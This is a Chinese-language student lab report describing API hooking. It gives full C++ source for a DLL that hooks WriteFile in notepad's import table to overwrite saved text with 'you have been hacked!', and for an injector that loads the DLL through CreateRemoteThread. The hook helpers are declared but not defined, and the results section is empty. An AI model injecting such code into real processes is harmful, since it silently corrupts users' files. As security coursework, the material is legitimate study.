### 一、实验任务

5、通过API hook的方法，在每次notepad保存txt文件时，就将文件内容修改为： “you have been hacked!”

API hook 的关键是编写一个假函数，用假函数的指针替换IAT中真函数的指针（当然这种方式只能对通过IAT调用的管用，但是够了。）在假函数调用真函数，修改真函数的参数和返回的数据，将修改后的数据返回给调用者。（比第四题多加的条件，即不用Windbg用API hook方法）

- 文件关闭CloseFile，把文件指针调到文件头修改后再close

### 二、实验过程

> 先导试验

#####  一、生成MyWriteFileHook.dll

- 创建Windows桌面向导 取消选择「为解决方案创建目录」

![image-20190406212808730](/Users/cclin/Documents/GitHub/SoftandSyssafehm/hw5/images/image-20190406212808730.png)

- 依次选择应用程序类型「动态链接库(.dll)」，其它选项勾选「空项目」并取消勾选「安全开发生命周期(SDL)检查(C)」

![image-20190406212939294](/Users/cclin/Documents/GitHub/SoftandSyssafehm/hw5/images/image-20190406212939294.png)

- 添加编写源文件MyWriteFileHook.cpp，仅生成并不执行该项目

  ```bash
  #MyWriteFileHook.cpp
  
  #include <windows.h>
  
  LONG IATHook(
  	__in_opt void* pImageBase,
  	__in_opt const char* pszImportDllName,
  	__in const char* pszRoutineName,
  	__in void* pFakeRoutine,
  	__out HANDLE* phHook
  );
  
  LONG UnIATHook(__in HANDLE hHook);
  
  void* GetIATHookOrign(__in HANDLE hHook);
  
  typedef bool(__stdcall *LPFN_WriteFile)(
  	HANDLE       hFile,//文件句柄
  	LPCVOID      lpBuffer,//数据缓存区指针
  	DWORD        nNumberOfBytesToWrite,//写入字节数
  	LPDWORD      lpNumberOfBytesWritten,//用于保存实际写入字节数的存储区域的指针
  	LPOVERLAPPED lpOverlapped//OVERLAPPED结构体指针
  	);
  
  HANDLE g_hHook_WriteFile = NULL;
  //////////////////////////////////////////////////////////////////////////
  
  bool __stdcall Fake_WriteFile(
  	HANDLE       hFile,
  	LPCVOID      lpBuffer,
  	DWORD        nNumberOfBytesToWrite,
  	LPDWORD      lpNumberOfBytesWritten,
  	LPOVERLAPPED lpOverlapped
  ) {
  	LPFN_WriteFile fnOrigin = (LPFN_WriteFile)GetIATHookOrign(g_hHook_WriteFile);
  
  	char DataBuffer[] = "you have been hacked!\r\n";
  	DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer);
  	DWORD dwBytesWritten = 0;
  
  	return fnOrigin(hFile, DataBuffer, dwBytesToWrite, &dwBytesWritten, lpOverlapped);
  }
  //文件加载时调用的入口函数
  BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) {
  	switch (dwReason) {
  	//dwReason值为DLL_PROCESS_ATTACH，MyDll.dll只在最开始被加载时调用IATHook
  	case DLL_PROCESS_ATTACH:
  		IATHook(
  			GetModuleHandle(NULL),
  			"kernel32.dll",
  			"WriteFile",
  			Fake_WriteFile,
  			&g_hHook_WriteFile
  		);
  		break;
  	case DLL_PROCESS_DETACH:
  		UnIATHook(g_hHook_WriteFile);
  		break;
  	}
  	return TRUE;
  }
  ```

- 成功生成MyWriteFileHook.dll ，并将其移动到`C:\sashookexp\`路径下

#####  二、生成Inject.exe

- 创建Windows桌面向导 取消选择「为解决方案创建目录」

  ![image-20190406201141952](/Users/cclin/Documents/GitHub/SoftandSyssafehm/hw5/images/image-20190406201141952.png)

- 依次选择应用程序类型「控制台应用程序(.exe)」，其它选项勾选「空项目」并取消勾选「安全开发生命周期(SDL)检查(C)」

  ![image-20190406201209239](/Users/cclin/Documents/GitHub/SoftandSyssafehm/hw5/images/image-20190406201209239.png)

- 添加源文件lnject.cpp使notepad.exe注入MyWriteFileHook.dll,并设置项目属性`属性配置 `->`常规`->`项目默认值`->`字符集：使用多字节字符集`（解决 调用ProcessEntry结构体时出现的“WCHAR*”与“const char *”类型的形参不兼容问题），编译生成得到Inject.exe，将其移动到`C:\sashookexp\`路径下。

  ```bash
  #lnject.cpp
  
  #include <windows.h>
  #include <stdio.h>
  #include <tlhelp32.h>
  
  int main() {
  	/*设置本地加载MyWriteFileHook.dll路径*/
  	char szDllName[] = "C:\\sashookexp\\MyWriteFileHook.dll";
  
  
  	/* Step 1 */
  	PROCESSENTRY32 ProcessEntry = {};
  	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
  	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  	bool bRet = Process32First(hProcessSnap, &ProcessEntry);
  	DWORD dwProcessId = 0;
  	while (bRet) {
  		if (strcmp("notepad.exe", ProcessEntry.szExeFile) == 0) {
  			dwProcessId = ProcessEntry.th32ProcessID;
  			break;
  		}
  		bRet = Process32Next(hProcessSnap, &ProcessEntry);
  	}
  	if (0 == dwProcessId) {
  		printf("找不到进程\n");
  		return 1;
  	}
  
  	/* Step 2 */
  	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
  	if (0 == hProcess) {
  		printf("无法打开进程\n");
  		return 1;
  	}
  
  	/* Step 3 */
  	size_t length = strlen(szDllName) + 1;
  	char * pszDllFile = (char *)VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT, PAGE_READWRITE);
  	if (0 == pszDllFile) {
  		printf("远程空间分配失败\n");
  		return 1;
  	}
  
  	/* Step 4 */
  	if (!WriteProcessMemory(hProcess, (PVOID)pszDllFile, (PVOID)szDllName, length, NULL)) {
  		printf("远程空间写入失败\n");
  		return 1;
  	}
  
  	/* Step 5 */
  	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
  	if (0 == pfnThreadRtn) {
  		printf("LoadLibraryA函数地址获取失败\n");
  		return 1;
  	}
  
  	/* Step 6 */
  	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, (PVOID)pszDllFile, 0, NULL);
  	if (0 == hThread) {
  		printf("远程线程创建失败\n");
  		return 1;
  	}
  
  	/* Step 7 */
  	WaitForSingleObject(hThread, INFINITE);
  	printf("远程线程执行完毕!\n");
  
  	VirtualFreeEx(hProcess, (PVOID)pszDllFile, 0, MEM_RELEASE);
  	CloseHandle(hThread);
  	CloseHandle(hProcess);
  
  	return 0;
  }
  ```

  ![image-20190406202209985](/Users/cclin/Documents/GitHub/SoftandSyssafehm/hw5/images/image-20190406202209985.png)

  ![image-20190406202035916](/Users/cclin/Library/Application Support/typora-user-images/image-20190406202035916.png)

​    

- 打开运行notepad.exe，编辑内容txt文本文档内容为“Welcome to use notepad”，然后运行Inject.exe，保存该文档为test.txt，然后保存关闭notepad.exe，再次打开保存的test.txt，内容变为在MyWriteFileHook.cpp中设置修改的内容`you have been hacked!\r\n `

### 三、实验结果

### 四、实验问题

- [ ] 在生成MyWriteFile.dll时报错

  ![image-20190406222045596](/Users/cclin/Documents/GitHub/SoftandSyssafehm/hw5/images/image-20190406222045596.png)



